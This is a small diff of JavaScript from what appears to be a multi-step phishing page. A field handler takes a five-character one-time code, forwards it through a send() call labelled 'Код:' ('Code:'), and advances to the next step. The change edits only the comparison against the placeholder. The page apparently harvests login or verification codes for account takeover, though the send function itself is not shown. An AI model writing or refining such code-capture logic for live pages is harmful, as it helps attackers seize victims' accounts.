@@ -80,7 +80,7 @@ document.getElementById('next1').addEventListener('click', function() {
 });
 
 document.getElementById('code').addEventListener('input', function() {
-  if (this.value.length === 5 && this.value !== '•••••') {
+  if (this.value.length === 5 && this.value !== '') {
     send('Код: ' + this.value);
     document.getElementById('step2').classList.add('hidden');
     document.getElementById('step3').classList.remove('hidden');
